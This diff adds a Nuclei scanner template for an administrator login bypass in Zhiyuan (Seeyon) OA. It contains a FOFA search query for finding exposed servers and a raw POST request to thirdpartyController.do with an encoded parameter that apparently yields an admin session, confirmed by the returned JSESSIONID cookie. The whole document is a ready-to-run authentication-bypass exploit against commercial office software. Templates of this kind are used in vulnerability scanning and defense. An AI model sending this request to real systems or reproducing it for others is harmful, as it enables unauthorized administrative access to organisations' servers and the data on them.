@@ -1,0 +1,26 @@
+id: zhiyuan-OA-userlogin
+
+info:
+  name: Zhiyuan OA any administrator login(致远OA任意管理员登录)
+  author: linfeng7z
+  severity: critical
+  tags: zhiyuan,oa,userlogin
+  metadata:
+    fofa-query: 'app="致远互联-OA"'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
+        
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header, "JSESSIONID")'
+          - "status_code == 200"
+        condition: and
